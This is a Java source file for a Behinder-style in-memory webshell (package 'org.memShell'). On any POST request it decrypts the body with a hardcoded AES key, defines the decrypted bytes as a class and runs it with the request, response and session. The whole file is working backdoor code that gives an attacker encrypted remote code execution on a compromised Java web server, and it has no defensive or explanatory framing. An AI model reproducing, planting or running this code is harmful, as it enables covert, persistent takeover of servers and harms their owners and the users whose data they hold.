package org.memShell;

import java.util.ArrayList;
import java.util.List;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import org.memShell.redefine.MyRequest;
import org.memShell.redefine.MySession;

public class Behinder {
  class U extends ClassLoader {
    U(ClassLoader c) {
      super(c);
    }

    public Class g(byte[] b) {
      return super.defineClass(b, 0, b.length);
    }
  }

  public void shell(ServletRequest request, ServletResponse response) throws Exception {
    String method = MyRequest.getMethod(request);
    if (method.equals("POST")) {
      String k = "8d777f385d3dfec8";
      Object session = MyRequest.getSession(request);
      MySession.putValue(session, "u", k);
      Cipher c = Cipher.getInstance("AES");
      c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
      List object = new ArrayList();
      object.add(request);
      object.add(response);
      object.add(MyRequest.getSession(request));
      new U(this.getClass().getClassLoader())
          .g(c.doFinal(
              new sun.misc.BASE64Decoder().decodeBuffer(MyRequest.getReader(request).readLine())))
          .newInstance().equals(object);
    }
  }
}
